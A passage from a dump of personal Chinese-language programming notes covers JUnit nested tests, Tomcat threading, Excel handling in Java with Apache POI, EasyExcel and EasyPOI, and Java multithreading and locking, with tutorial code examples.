PrimaryTests {\n\n        @Test\n        void test1() {\n        }\n    }\n\n    @Nested\n    @Order(2)\n    class SecondaryTests {\n\n        @Test\n        void test2() {\n        }\n    }\n}\n```\n# Nested Tests\n```java\n@DisplayName(\"A stack\")\nclass TestingAStackDemo {\n\n    Stack<Object> stack;\n\n    @Test\n    @DisplayName(\"is instantiated with new Stack()\")\n    void isInstantiatedWithNew() {\n        new Stack<>();\n    }\n\n    @Nested\n    @DisplayName(\"when new\")\n    class WhenNew {\n\n        @BeforeEach\n        void createNewStack() {\n            stack = new Stack<>();\n        }\n\n        @Test\n        @DisplayName(\"is empty\")\n        void isEmpty() {\n            assertTrue(stack.isEmpty());\n        }\n\n        @Test\n        @DisplayName(\"throws EmptyStackException when popped\")\n        void throwsExceptionWhenPopped() {\n            assertThrows(EmptyStackException.class, stack::pop);\n        }\n\n        @Test\n        @DisplayName(\"throws EmptyStackException when peeked\")\n        void throwsExceptionWhenPeeked() {\n            assertThrows(EmptyStackException.class, stack::peek);\n        }\n\n        @Nested\n        @DisplayName(\"after pushing an element\")\n        class AfterPushing {\n\n            String anElement = \"an element\";\n\n            @BeforeEach\n            void pushAnElement() {\n                stack.push(anElement);\n            }\n\n            @Test\n            @DisplayName(\"it is no longer empty\")\n            void isNotEmpty() {\n                assertFalse(stack.isEmpty());\n            }\n\n            @Test\n            @DisplayName(\"returns the element when popped and is empty\")\n            void returnElementWhenPopped() {\n                assertEquals(anElement, stack.pop());\n                assertTrue(stack.isEmpty());\n            }\n\n            @Test\n            @DisplayName(\"returns the element when peeked but remains not empty\")\n            void returnElementWhenPeeked() {\n                assertEquals(anElement, stack.peek());\n                assertFalse(stack.isEmpty());\n            }\n        }\n    }\n}\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122532.png)\n\n"
  },
  {
    "title": "./notes/back-end/tomcat.md",
    "body": "![](https://raw.githubusercontent.com/NaisWang/images/master/20220327145103.png)\n\ntomcat内部采用的就是多线程，上百个客户端访问同一个web应用，tomcat接入后都是把后续的处理扔给一个新的线程来处理，这个新的线程最后调用到我们的servlet程序，比如doGet或者doPost方法。\n如果不采用多线程机制，上百个人同时访问一个web应用的时候，tomcat就得排队串行处理了，那样客户端根本是无法忍受那种访问速度的。\n"
  },
  {
    "title": "./notes/back-end/java操作excel.md",
    "body": "# 简介\n开发中经常会设计到excel的处理，如导出Excel，导入Excel到数据库中！\n操作Excel目前比较流行的就是Apache POI和阿里巴巴的easyExcel！\n\n# Apache POI\nApache POI是Apache软件基金会的开放源码函式库，POl提供API给Java程序对Microsoft Office格式档案读和写的功能。\n\n## 基本功能\n- HSSF: 提供读写Microsoft Excel格式(后缀名为xls)档案的功能，\n- XSSF: 提供读写Microsoft Excel OOXM格式(后缀名为xlsx)档案的功能。\n- HWPF: 提供读写Microsoft Word各式档案的功能。\n- HSLF: 提供读写Microsoft PowerPoint格式档案的功能。\n- HDGF: 提供读写Microsoft visio格式档案的功能。\n\n**xls和xlsx有什么区别**\n- 文件格式不同。xls 是一个特有的二进制格式，其核心结构是复合文档类型的结构，而 xlsx 的核心结构是 XML 类型的结构，采用的是基于 XML 的压缩方式，使其占用的空间更小。xlsx 中最后一个 x 的意义就在于此。\n- 版本不同。xls是excel2003及以前版本生成的文件格式，而xlsx是excel2007及以后版本生成的文件格式。\n- 兼容性不同。xlsx格式是向下兼容的，可兼容xls格式。\n\n## 基本读写操作实战\n**引入依赖**\n```xml\n<!-- xls  -->\n<dependency>\n  <groupId>org.apache.poi</groupId>\n  <artifactId>poi</artifactId>\n  <version>3.9</version>\n</dependency>\n\n<!-- xlsx  -->\n<dependency>\n  <groupId>org.apache.poi</groupId>\n  <artifactId>poi-ooxml</artifactId>\n  <version>3.9</version>\n</dependency>\n```\n\n**写核心代码：**\n```java\npublic static void testWrite() throws Exception{\n  //创建xls类型的工作簿\n  Workbook workbook = new HSSFWorkbook(); \n  // //创建xlsx类型的工作簿\n  // Workbook workbook = new XSSFWorkbook();\n  // //创建xlsx类型的工作簿\n  // Workbook workbook = new SXSSFWorkbook();\n\n  //创建一个工作表\n  Sheet sheet = workbook.createSheet(\"whz\");\n  //创建第一行\n  Row row1 = sheet.createRow(0);\n  //在第一行上创建第一个单元格\n  Cell cell1 = row1.createCell(0);\n  cell1.setCellValue(\"今日新增观众\");\n  //在第一行上创建第二个单元格\n  Cell cell2 = row1.createCell(1);\n  cell2.setCellValue(\"888\");\n\n  //创建第二行\n  Row row2 = sheet.createRow(1);\n  Cell cell3 = row2.createCell(0);\n  cell3.setCellValue(\"统计时间\");\n  Cell cell4 = row2.createCell(1);\n  cell4.setCellValue(\"2010-2-1\");\n\n  //生成excel文件\n  FileOutputStream fileOutputStream = new FileOutputStream(\"L://测试表.xls\");\n  workbook.write(fileOutputStream);\n  fileOutputStream.close();\n}\n```\n\n**效果**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122437.png)\n\n\n**读核心代码：**\n```java\npublic void testRead() throws Exception{\n  //获取文件流\n  FileInputStream inputStream = new FileInputStream(\"L://测试表.xls\");\n  //得到工作簿\n  Workbook workbook = new HSSFWorkbook(inputStream);\n  //得到工作表\n  Sheet sheet = workbook.getSheetAt(0);\n  //得到行\n  Row row = sheet.getRow(0);\n  //得到单元格\n  Cell cell = row.getCell(1);\n  //读取单元格的值，一定要注意类型\n  System.out.println(cell.getStringCellValue());\n\n  inputStream.close();\n}\n```\n\n## 大数据量的写入\n### 大文件写HSSF\n缺点：最多只能处理65536行，否则会抛出异常\n```\njava.lang.IllegalArgumentException:Invalid row number（65536）outside allowable range（0..65535）\n```\n优点：过程中写入缓存，不操作磁盘，最后一次性写入磁盘，速度快\n\n### 大文件写XSSF\n缺点：写数据时速度非常慢，非常耗内存，也会发生内存溢出，如100万条\n优点：可以写较大的数据量，如20万条\n\n### 大文件写SXSSF\n优点：可以写非常大的数据量，如100万条甚至更多条，写数据速度快，占用更少的内存\n\n**注意：**\n过程中会产生临时文件，如下，\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122447.png)\n\n我们可以在在关闭输出流之后，使用下面代码来清除临时文件\n```java\n((SXSWorkbook) workbook).dispose();\n```\n\n默认由100条记录被保存在内存中，如果超过这数量，则最前面的数据被写入临时文件如果想自定义内存中数据的数量，可以使用`new SXSSFWorkbook(数量)`\n\nSXSSFWorkbook-来至官方的解释：实现“BigGridDemo”策略的流式XSSFWorkbook版本。这允许写入非常大的文件而不会耗尽内存，因为任何时候只有可配置的行部分被保存在内存中。\n请注意，仍然可能会消耗大量内存，这些内存基于您正在使用的功能，例如合并区域，注释……仍然只存储在内存中，因此如果广泛使用，可能需要大量内存。\n\n\n# EasyExcel \nEasyExcel是阿里巴巴开源的一个excel处理框架，以使用简单、节省内存著称。\nEasyExcel能大大减少占用内存的主要原因是在解析Excel时没有将文件数据一次性全部加载到内存中，而是从磁盘上一行行读取数据，逐个解析。\n下图是EasyExcel和POI在解析Excel时的对比图。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122458.png)\n\n官方文档：https://www.yuque.com/easyexcel/doc/easyexcel\n\nEasyExcle将excel文件看成如下接口：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122508.png)\n\n# EasyPOI\n为了解决上述poi的缺点，国内有很多开源项目对poi进行了封装，大大减少代码量，使其能够更简单的被我们使用并提高开发效率，例如EasyPoi,Excel4]等优秀的开源项目。我们这次以EasyPoi为例\neasypoi功能如同名字easy，主打的功能就是容易，让一个没见接触过poi的人员就可以方便的写出Excel导出，Excel模板导出，Excel导入，Word模板导出，通过简单的注解和模板语言（熟悉的表达式语法）.完成以前复杂的写法。\n\n独特的功能:\n- 基于注解的导入导出,修改注解就可以修改Excel\n- 支持常用的样式自定义\n- 基于map可以灵活定义的表头字段\n- 支持一堆多的导出,导入\n- 支持模板的导出,一些常见的标签,自定义标签\n- 支持HTML/Excel转换,如果模板还不能满足用户的变态需求,请用这个功能\n- 支持word的导出,支持图片,Excel\n\n更多教程可以参考官方API：http://easypoi.mydoc.io/#text_202979\n\n## 注解\neasypoi起因就是Excel的导入导出,最初的模板是实体和Excel的对应,model--row,filed--col 这样利用注解我们可以和容易做到excel到导入导出 经过一段时间发展,现在注解有5个类分别是\n- `@Excel`: 作用到filed上面,是对Excel一列的一个描述\n- `@ExcelCollection`: 表示一个集合,主要针对一对多的导出,比如一个老师对应多个科目,科目就可以用集合表示\n- `@ExcelEntity`: 表示一个继续深入导出的实体,但他没有太多的实际意义,只是告诉系统这个对象里面同样有导出的字段\n- `@ExcelIgnore`: 和名字一样表示这个字段被忽略跳过这个导导出\n- `@ExcelTarget` 这个是作用于最外层的对象,描述这个对象的id,以便支持一个对象可以针对不同导出做出不同处理\n\n### @Excel\n这个是必须使用的注解,如果需求简单只使用这一个注解也是可以的,涵盖了常用的Excel需求,需要大家熟悉这个功能,主要分为基础,图片处理,时间处理,合并处理几块,name_id是上面讲的id用法,这里就不累言了\n| 属性           | 类型     | 默认值           | 功能                                                                                                                |\n| -------------- | -------- | ---------------- | ------------------------------------------------------------------------------------------------------------------- |\n| name           | String   | null             | 列名,支持name_id                                                                                                    |\n| needMerge      | boolean  | fasle            | 是否需要纵向合并单元格(用于含有list中,单个的单元格,合并list创建的多个row)                                           |\n| orderNum       | String   | \"0\"              | 列的排序,支持name_id                                                                                                |\n| replace        | String[] | {}               | 值得替换 导出是{a_id,b_id} 导入反过来                                                                               |\n| savePath       | String   | \"upload\"         | 导入文件保存路径,如果是图片可以填写,默认是upload/className/ IconEntity这个类对应的就是upload/Icon/                  |\n| type           | int      | 1                | 导出类型 1 是文本 2 是图片,3 是函数,10 是数字 默认是文本                                                            |\n| width          | double   | 10               | 列宽                                                                                                                |\n| height         | double   | 10               | 列高,后期打算统一使用@ExcelTarget的height,这个会被废弃,注意                                                         |\n| isStatistics   | boolean  | fasle            | 自动统计数据,在追加一行统计,把所有数据都和输出 这个处理会吞没异常,请注意这一点                                      |\n| isHyperlink    | boolean  | false            | 超链接,如果是需要实现接口返回对象                                                                                   |\n| isImportField  | boolean  | true             | 校验字段,看看这个字段是不是导入的Excel中有,如果没有说明是错误的Excel,读取失败,支持name_id                           |\n| exportFormat   | String   | \"\"               | 导出的时间格式,以这个是否为空来判断是否需要格式化日期                                                               |\n| importFormat   | String   | \"\"               | 导入的时间格式,以这个是否为空来判断是否需要格式化日期                                                               |\n| format         | String   | \"\"               | 时间格式,相当于同时设置了exportFormat 和 importFormat                                                               |\n| databaseFormat | String   | \"yyyyMMddHHmmss\" | 导出时间设置,如果字段是Date类型则不需要设置 数据库如果是string 类型,这个需要设置这个数据库格式,用以转换时间格式输出 |\n| numFormat      | String   | \"\"               | 数字格式化,参数是Pattern,使用的对象是DecimalFormat                                                                  |\n| imageType      | int      | 1                | 导出类型 1 从file读取 2 是从数据库中读取 默认是文件 同样导入也是一样的                                              |\n| suffix         | String   | \"\"               | 文字后缀,如% 90 变成90%                                                                                             |\n| isWrap         | boolean  | true             | 是否换行 即支持\\n                                                                                                   |\n| mergeRely      | int[]    | {}               | 合并单元格依赖关系,比如第二列合并是基于第一列 则{0}就可以了                                                         |\n| mergeVertical  | boolean  | fasle            | 纵向合并内容相同的单元格                                                                                            |\n| fixedIndex     | int      | -1               | 对应excel的列,忽略名字                                                                                              |\n| isColumnHidden | boolean  | false            | 导出隐藏列                                                                                                          |\n\n### @ExcelTarget\n限定一个到处实体的注解,以及一些通用设置,作用于最外面的实体\n| 属性     | 类型   | 默认值 | 功能         |\n| -------- | ------ | ------ | ------------ |\n| value    | String | null   | 定义ID       |\n| height   | double | 10     | 设置行高     |\n| fontSize | short  | 11     | 设置文字大小 |\n\n### @ExcelEntity\n标记是不是导出excel 标记为实体类,一遍是一个内部属性类,标记是否继续穿透,可以自定义内部id\n| 属性 | 类型   | 默认值 | 功能   |\n| ---- | ------ | ------ | ------ |\n| id   | String | null   | 定义ID |\n\n### @ExcelCollection\n一对多的集合注解,用以标记集合是否被数据以及集合的整体排序\n| 属性     | 类型     | 默认值          | 功能                     |\n| -------- | -------- | --------------- | ------------------------ |\n| id       | String   | null            | 定义ID                   |\n| name     | String   | null            | 定义集合列名,支持nanm_id |\n| orderNum | int      | 0               | 排序,支持name_id         |\n| type     | Class<?> | ArrayList.class | 导入时创建对象使用       |\n\n### @ExcelIgnore\n忽略这个属性,多使用需循环引用中,无需多解释吧^^\n\n## 实体定义类：\n```java\n@Data\npublic class PartyMember implements Serializable{\n  @Excel(name = \"姓名\")\n  @NotNull(message = \"姓名不能为空\")\n  private String name;\n\n  @Excel(name = \"身份证\")\n  private String idCard;\n\n  @Excel(name = \"入党时间\", format = \"yyyy-MM-dd\")\n  private Date joinPartyTime;\n\n  @Excel(name = \"党员状态\", replace = {\"在职_1\", \"离职_2\"}, isImportField = \"true\")\n  private String state;\n\n  @ExcelEntity(name =\"民族\")\n  private Nation nation;\n\n  @ExcelCollection(name = \"学生\", orderNum = \"4\")\n  private List<StudentEntity> students;\n}\n```\n```java\n@Data\npublic class Nation implements Serializable {\n\n    private Integer id;\n\n    @Excel(name = \"民族\")\n    private String name;\n}\n```\n\n接下来是工具类的编写：\n**注：此处的导入导出是相对程序，而不是相对于excel。即导入是将excel中的数据导入到程序中，导出是将程序中的数据导出到excel中**\n\n## Excel导入介绍\n```java\n@Test\npublic void test2() {\n    ImportParams params = new ImportParams();\n    params.setTitleRows(1);\n    params.setHeadRows(1);\n    long start = new Date().getTime();\n    List<MsgClient> list = ExcelImportUtil.importExcel(\n        new File(PoiPublicUtil.getWebRootPath(\"import/ExcelExportMsgClient.xlsx\")),\n        MsgClient.class, params);\n    System.out.println(new Date().getTime() - start);\n    System.out.println(list.size());\n    System.out.println(ReflectionToStringBuilder.toString(list.get(0)));\n}\n```\n### ImportParams\nImportParams 参数介绍下\n| 属性             | 类型                | 默认值               | 功能                                                                                                                              |\n| ---------------- | ------------------- | -------------------- | --------------------------------------------------------------------------------------------------------------------------------- |\n| titleRows        | int                 | 0                    | 表格标题行数,默认0                                                                                                                |\n| headRows         | int                 | 1                    | 表头行数,默认1                                                                                                                    |\n| startRows        | int                 | 0                    | 字段真正值和列标题之间的距离 默认0                                                                                                |\n| keyIndex         | int                 | 0                    | 主键设置,如何这个cell没有值,就跳过 或者认为这个是list的下面的值， 这一列必须有值,不然认为这列为无效数据                           |\n| startSheetIndex  | int                 | 0                    | 开始读取的sheet位置,默认为0                                                                                                       |\n| sheetNum         | int                 | 1                    | 上传表格需要读取的sheet 数量,默认为1                                                                                              |\n| needSave         | boolean             | false                | 是否需要保存上传的Excel                                                                                                           |\n| needVerfiy       | boolean             | false                | 是否需要校验上传的Excel                                                                                                           |\n| saveUrl          | String              | \"upload/excelUpload\" | 保存上传的Excel目录,默认是 如 TestEntity这个类保存路径就是upload/excelUpload/Test/yyyyMMddHHmss* 保存名称上传时间五位随机数       |\n| verifyHanlder    | IExcelVerifyHandler | null                 | 校验处理接口,自定义校验                                                                                                           |\n| lastOfInvalidRow | int                 | 0                    | 最后的无效行数,不读的行数                                                                                                         |\n| readRows         | int                 | 0                    | 手动控制读取的行数                                                                                                                |\n| importFields     | String[]            | null                 | 导入时校验数据模板,是不是正确的Excel                                                                                              |\n| keyMark          | String              | \":\"                  | Key-Value 读取标记,以这个为Key,后面一个Cell 为Value,多个改为ArrayList                                                             |\n| readSingleCell   | boolean             | false                | 按照Key-Value 规则读取全局扫描Excel,但是跳过List读取范围提升性能， 仅仅支持titleRows + headRows + startRows 以及 lastOfInvalidRow |\n| dataHanlder      | IExcelDataHandler   | null                 | 数据处理接口,以此为主,replace,format都在这后面                                                                                    |\n\n"
  },
  {
    "title": "./notes/back-end/高并发与高可用.md",
    "body": "# 进程与线程\n\n# 线程\nJava语言的JVM允许程序运行多个线程，它通过java.lang.Thread类来体现。\n\n**Thread类的特性**\n- 每个线程都是通过某个特定Thread对象的run()方法来完成操作的，经常把run()方法的主体称为`线程体`\n- 通过该Thread对象的start()方法来启动这个线程，start方法内部会调用run()方法。只调用run()方法，不调用start方法，是不能启动线程的\n- 一个已经启动的线程不能再调用start方法，否则会抛`IllegalThreadStateException`异常\n\n## 多线程的创建\n### 方式一：通过继承Thread类\n1. 创建一个继承Thread类的子类\n2. 重写Thread类的run()方法\n3. 创建Thread类的子类的对象\n4. 通过此对象调用start()\n示例：\n```java\nclass MyThread extends Thread{\n  @Override\n  public void run(){\n    System.out.println(\"jfkdf\");\n  }\n}\npublic class Te{\n  public static void main(String[] args) throws Exception{\n    MyThread t1 = new MyThread(); \n    t1.start();//启动线程 -> 调用当前线程的run()\n  }\n}\n```\n\n### 方法二：通过Runnable接口\n1. 创建一个实现了Runnable接口的实现类\n2. 实现类去实现Runnable中的抽象方法: run()\n3. 创建实现类的对象\n4. 将此对象作为参数传递到Thread类的构造器中，创建Thread类的对象\n5. 通过Thread类的对象调用start()\n```java\nclass MyThread implements Runnable{\n  @Override\n  public void run(){\n    System.out.println(\"fjdkf\");\n  }\n}\npublic class Te<T> {\n  public static void main(String[] args) throws Exception{\n    Thread t1 = new Thread(new MyThread()); \n    t1.start();//启动线程 -> 调用当前线程的run() -> 调用了Runnable类型的target的run()\n  }\n}\n```\n## jdk5.0新增线程创建方式\n### 新增方式一：实现Callable接口\n与使用Runnable相比，Callable功能更强大些\n- 相比run（）方法，可以有返回值\n- 方法可以抛出异常\n- 支持泛型的返回值\n- 需要借助FutureTask类，比如获取返回结果\n**Future接口**\n- 可以对具体Rurnable、Callable任务的执行结果进行取消、查询是否完成、获取结果等。\n- FutrueTask是Futrue接口的唯一的实现类\n- FutureTask 同时实现了Runnable，Future接口。它既可以作为Runnable被线程执行，又可以作为Future得到Callable的返回值\n```java\n//1. 创建一个实现Callable的实现类\nclass MyThread implements Callable{\n  //2. 实现call方法\n  @Override\n  public Object call() throws Exception{\n    return \"whz\";\n  }\n}\npublic class Te{\n  public static void main(String[] args){\n    //3. 创建Callable接口实现类的对象\n    MyThread a = new MyThread(); \n    //4. 将此Callable接口实现类的对象作为参数传递到FutureTask构造器中，创建FutureTask对象\n    FutureTask b = new FutureTask(a);\n    //5. 将FutureTask的对象作为参数传递到Thread的构造器中，创建Thread对象\n    Thread t = new Thread(b);\n    t.run();\n    try{\n      //get()返回值即为FutureTask构造器参数Callable实现类重写的call()方法的返回值\n      //并且get()会一直等待该返回值, 知道有返回值后才结束\n      System.out.println(b.get());//输出：whz\n    }catch(Exception e){\n\n    }\n  }\n}\n```\n### 新增方式二：使用线程池\n背景：经常创建和销毁、使用量特别大的资源，比如并发情况下的线程，对性能影响很大。\n思路：提前创建好多个线程，放入线程池中，使用时直接获取，使用完放回池中。可以避免频繁创建销毁、实现重复利用。类似生活中的公共交通工具。\n好处：\n- 提高响应速度（减少了创建新线程的时间）\n- 降低资源消耗（重复利用线程池中线程，不需要每次都创建）\n- 便于线程管理\n  - corePoolSize：核心池的大小\n  - maximumPoolSize：最大线程数\n  - keepAliveTime：线程没有任务时最多保持多长时间后会终止\n  - ...\n\n**JDK5.0起提供了线程池相关APl:ExecutorService和Executors**\n**ExecutorService**：真正的线程池接口。常见子类ThreadPoolExecutor\n- `void execute(Runnable command)`：执行任务/命令，没有返回值，一般用来执行长Runnable\n- `<T>Future<T>submit(Callable<T>task)`：执行任务，有返回值，一般又来执行Callable\n- `void shutdown()`：关闭连接池\n\n**Executors**：工具类、线程池的工厂类，用于创建并返回不同类型的线程池\n- Executors.newCachedThreadPool()：创建一个可根据需要创建新线程的线程池\n- Executors.newFixedThreadPool(n)；创建一个可重用固定线程数的线程池\n- Executors.newSingleThreadExecutor()：创建一个只有一个线程的线程池\n- Executors.newScheduledThreadPool(n)：创建一个线程池，它可安排在给定延迟后运行命令或者定期地执行。\n\n```java\nclass MyThread implements Callable{\n  @Override\n  public Object call() throws Exception{\n    System.out.println(this);\n    return \"jfkdjf\";\n  }\n}\nclass MyThread1 implements Runnable{\n  @Override\n  public void run(){\n    System.out.println(this);\n  }\n}\n\npublic class Te{\n  public static void main(String[] args){\n    ExecutorService service = Executors.newFixedThreadPool(10);\n\n    //设置线程池的属性\n    ThreadPoolExecutor service1 = (ThreadPoolExecutor) service;\n    service1.setCorePoolSize(8);\n\n    service.execute(new MyThread1()); \n    service.execute(new MyThread1()); \n    service.submit(new MyThread());\n    service.submit(new MyThread());\n    service.shutdown();\n  }\n}\n```\n输出：\n```\nMyThread1@2b49e825\nMyThread1@c0bafe7\nMyThread@3b8e4865\nMyThread@58381dad\n```\n每次执行的顺序可能会不一样\n\n## Java多线程访问共享资源的方式：\n1、如果每一个线程执行的代码相同，可以使用同一个runnable对象，这个对象中有那个共享数据（买票系统）\n2、如果每一个线程执行的代码不相同，这时候需要不同的Runnable对象，有以下两种方式来实现这些Runnable对戏之间的数据共享。\n(1)、将共享数据封装在另外一个对象中，然后将这个对象逐一传递给各个Runnable对象。每个线程对共享数据的操作方法也分配到那个对象身上去完成，这样容易实现针对该数据进行的各个操作的互斥和通信。\n(2)、将这些Runnable对象作为某一个类中的内部类，共享数据作为这个外部类中的成员变量，每个线程对共享数据的操作方法也分配给外部类，以便实现对共享数据进行的各个操作的互斥和通信，作为内部类的各个Runnable对象调用外部类的这些方法。\n(3)、上面两种方式的组合：将共享数据封装在另外一个对象中，每个线程对共享数据的操作方法也分配到那个对象身上去完成，对象作为这个外部类中的成员变量或方法中的局部变量，每个线程的Runnable对象作为外部类中的成员内部类或局部内部类。\n(4)、总之，要同步互斥的几段代码最好是分别放在几个独立的方法中，这些方法再放在同一个类中，这样比较容易实现它们之间的同步互斥和通信。\n3、极端且简单的方式，即在任意一个类中定义一个static的变量，这将被所有线程共享\n在线程操作中由于其操作的不确定性，所以提供了一个方法，可以取得当前操作线程：\npublic static Thread currentThread();\n\n## Thread类的有关方法\n- `void start()`：启动线程，并执行对象的run()方法\n- `run()`：线程在被调度时执行的操作\n- `String getName()`：返回线程的名称\n- `void setName(String name)`：设置该线程名称\n- `static Thread currentThread()`：返回当前线程。\n- `isAlive()`：判断当前线程是否存活\n- `interrupt()`: 打断线程, 如果被打断线程正在 sleep，wait，join 会导致被打断的线程抛出 InterruptedException，并清除 打断标记 ；如果打断的正在运行的线程，则会设置 打断标记 ；park 的线程被打断，也会设置 打断标记\n- `isInterrupted()`: 判断是否被打断，不会清除 打断标记\n- `static interrupted()`: 判断当前线程是否被打断\n- `getPriority()`: 获取线程优先级\n- `setPriority(int)`: 修改线程优先级 java中规定线程优先级是1~10 的整数，较大的优先级能提高该线程被 CPU 调度的机率\n- `getState()`: 获取线程状态,Java 中线程状态是用 6 个 enum 表示，分别为：NEW, RUNNABLE, BLOCKED, WAITING, TIMED_WAITING, TERMINATED\n\n**Thread类中有关的暂停和恢复的方法**\n1. `sleep(long millitime)`方法\nsleep()方法是Thread类中的静态方法，线程在指定的millitime时间内为阻塞状态。通常线程休眠到指定的时间后，不会立刻进入执行状态，而只是可以参与调度执行。\n2. `yield()`方法\n释放当前cpu的使用权，变成阻塞状态\n4. `join()`方法\n在线程a中调用线程b的join()，此时线程a就进入阻塞状态，直到线程b完全执行完后，线程a才结束阻塞状态\n5. `wait()和notify()`方法\n这两个方法是在Object类声明的方法。wait()方法使线程进入阻塞状态，直到被另一个线程唤醒。notify()方法把线程状态的变化通知并唤醒另一等待线程\n\n## java中的线程调度\n**java的调度方式：**\n- 同优先级线程组成先进先出队列(先来先服务)，使用时间片策略\n- 对高优先级，使用优先调度的抢占式策略\n\n**Thread类中有关线程优先级的静态变量**\n- `MAX_PRIORITY`: 10\n- `MIN_PRIORITY`: 1\n- `NORM_PRIORITY`: 5\njava可设置的优先级数值范围为`[1,10]`\n\n**Thread涉及的方法**\n- `getPriority()`: 返回线程优先级值\n- `setPriority(int newPriority)`: 改变线程的优先级\n\n**说明**\n- 线程创建时会继承父线程的优先级\n- 低优先级只是获得调度的概率低，并非一定是在高优先级线程之后才被调用\n\n## java中线程的生命周期\n**JDK中用Thread.State枚举类定义了线程的六种状态**\n- 初始(NEW)：新创建了一个线程对象，但还没有调用start()方法。\n- 运行(RUNNABLE)：Java线程中将就绪（ready）和运行中（running）两种状态笼统的称为“运行”。线程对象创建后，其他线程(比如main线程）调用了该对象的start()方法。该状态的线程位于可运行线程池中，等待被线程调度选中，获取CPU的使用权，此时处于就绪状态（ready）。就绪状态的线程在获得CPU时间片后变为运行中状态（running）。\n- 阻塞(BLOCKED)：表示线程阻塞于锁。\n- 等待(WAITING)：进入该状态的线程需要等待其他线程做出一些特定动作（通知或中断）。\n- 超时等待(TIMED_WAITING)：该状态不同于WAITING，它可以在指定的时间后自行返回。\n- 终止(TERMINATED)：表示该线程已经执行完毕。\n\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122604.png)\n\n### 初始状态(NEW)\n实现Runnable接口和继承Thread可以得到一个线程类，new一个实例出来，线程就进入了初始状态。\n\n### 就绪状态(RUNNABLE之READY)\n- 就绪状态只是说你资格运行，调度程序没有挑选到你，你就永远是就绪状态。\n- 调用线程的start()方法，此线程进入就绪状态。\n- 当前线程sleep()方法结束，其他线程join()结束，等待用户输入完毕，某个线程拿到对象锁，这些线程也将进入就绪状态。\n- 当前线程时间片用完了，调用当前线程的yield()方法，当前线程进入就绪状态。\n- 锁池里的线程拿到对象锁后，进入就绪状态。\n\n### 运行中状态(RUNNABLE之RUNNING)\n线程调度程序从可运行池中选择一个线程作为当前线程时线程所处的状态。这也是线程进入运行状态的唯一的一种方式。\n\n### 阻塞状态(BLOCKED)\n阻塞状态是线程阻塞在进入synchronized关键字修饰的方法或代码块(获取锁)时的状态。\n\n### 等待(WAITING)\n处于这种状态的线程不会被分配CPU执行时间，它们要等待被显式地唤醒，否则会处于无限期等待的状态。\n\n### 超时等待(TIMED_WAITING)\n处于这种状态的线程不会被分配CPU执行时间，不过无须无限期等待被其他线程显示地唤醒，在达到一定时间后它们会自动唤醒。\n\n### 终止状态(TERMINATED)\n当线程的run()方法完成时，或者主线程的main()方法完成时，我们就认为它终止了。这个线程对象也许是活的，但是它已经不是一个单独执行的线程。线程一旦终止了，就不能复生。\n在一个终止的线程上调用start()方法，会抛出java.lang.IllegalThreadStateException异常。\n\n## 守护线程与非守护线程\nJava分为两种线程：用户线程和守护线程\n\n所谓**守护线程是指在程序运行的时候在后台提供一种通用服务的线程**，比如垃圾回收线程就是一个很称职的守护者，并且这种线程并不属于程序中不可或缺的部分。因 此，当所有的非守护线程结束时，程序也就终止了，同时会杀死进程中的所有守护线程。反过来说，只要任何非守护线程还在运行，程序就不会终止。\n\n守护线程和用户线程的没啥本质的区别：唯一的不同之处就在于虚拟机的离开：如果用户线程已经全部退出运行了，只剩下守护线程存在了，虚拟机也就退出了。 因为没有了被守护者，守护线程也就没有工作可做了，也就没有继续运行程序的必要了。\n\n将线程转换为守护线程可以通过调用Thread对象的setDaemon(true)方法来实现。在使用守护线程时需要注意一下几点：\n- thread.setDaemon(true)必须在thread.start()之前设置，否则会跑出一个IllegalThreadStateException异常。你不能把正在运行的常规线程设置为守护线程。\n- 在Daemon线程中产生的新线程也是Daemon的。\n- 守护线程应该永远不去访问固有资源，如文件、数据库，因为它会在任何时候甚至在一个操作的中间发生中断。\n\n## interrupt 方法详解\n目标进程调用interrupt()\n\n\n# 同步\n## 使用synchronized\n**synchronized同步代码块语法：**\n```java\nsynchronized(同步监视器){\n  //需要被同步的代码\n}\n```\n同步监视器：也称为锁，任何一个类的实例都可以充当锁，不同地址的实例对应不同的锁。相同地址的实例对应同把锁。\n需要同步的多个线程必须要使用同一把锁\n```java\npublic class Te{\n  public static void main(String[] args){\n    Window w = new Window();\n    Thread th1 = new Thread(w);\n    Thread th2 = new Thread(w);\n    th1.start();\n    th2.start();\n  }\n}\n\nclass Window implements Runnable{\n  private int ticket = 100;\n  Object obj = new Object(); //当obj锁对象写在这里时，则th1与th2线程所拥有的锁相同\n  @Override\n  public void run(){\n  //Object obj = new Object(); 当obj锁对象写在这里时，则th1与th2线程所拥有的锁不同\n    while(ticket > 0){\n      synchronized(obj){\n        try{\n          Thread.sleep(100);\n        }catch(InterruptedException e){\n          e.printStackTrace();\n        }\n        System.out.println(ticket--);\n      }\n    }\n  }\n}\n```\n**使用synchronized修饰方法：**\n- 使用synchronized修饰非静态方法时，该方法的同步监视器为this\n- 使用synchronized修饰静态方法时，该方法的同步监视器为静态方法所属类的字节码对象\n```java\npublic class Te{\n  public static void main(String[] args){\n    Window w = new Window();\n    Thread th1 = new Thread(w);\n    Thread th2 = new Thread(w);\n    th1.start();\n    th2.start();\n  }\n}\n\nclass Window implements Runnable{\n  private int ticket = 100;\n\n  //此时同步监视器为this；\n  public synchronized void reduce(){\n    try{\n      Thread.sleep(100);\n    }catch(InterruptedException e){\n      e.printStackTrace();\n    }\n    System.out.println(ticket--);\n  }\n\n  @Override\n  public void run(){\n    while(ticket > 0){\n      reduce();\n    }\n  }\n}\n```\n**Lock(锁)**\n- 从JDK5.0开始，Java提供了更强大的线程同步机制——通过显式定义同步锁对象来实现同步。同步锁使用Lock对象充当。\n- java.util.concurrent.locks.Lock接口是控制多个线程对共享资源进行访问的工具。锁提供了对共享资源的独占访问，每次只能有一个线程对Lock对象加锁，线程开始访问共享资源之前应先获得Lock对象。\n- ReentrantLock 类实现了Lock，它拥有与synchronized相同的并发性和内存语义，在实现线程安全的控制中，比较常用的是ReentrantLock，可以显式加锁、释放锁。\n```java\npublic class Te{\n  public static void main(String[] args){\n    Window w = new Window();\n    Thread th1 = new Thread(w);\n    Thread th2 = new Thread(w);\n    th1.start();\n    th2.start();\n  }\n}\n\nclass Window implements Runnable{\n  private int ticket = 100;\n\n  private ReentrantLock lock = new ReentrantLock();\n  @Override\n  public void run(){\n    while(ticket > 0){\n      